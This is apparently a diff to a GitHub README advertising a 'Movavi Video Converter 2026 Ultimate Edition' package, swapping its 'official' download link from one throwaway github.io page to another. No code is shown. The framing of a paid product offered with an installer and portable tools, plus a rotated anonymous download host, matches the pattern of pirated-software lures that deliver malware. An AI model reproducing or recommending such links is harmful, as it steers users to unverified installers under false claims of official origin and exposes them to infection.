@@ -2,7 +2,7 @@
 
 Movavi Video Converter 2026 Ultimate Edition is the definitive toolkit for users seeking the full power of Movavi's video conversion suite. This package provides the essential utilities to get the most out of your video projects, including a streamlined setup for the latest version and a portable mode for ultimate flexibility on your Windows 10/11 machine.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -56,7 +56,7 @@ A: The main limitations are system resources. Processing 4K video or using heavy
 
 For the latest version of this package, including the installer and portable tools, please use the official download link:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
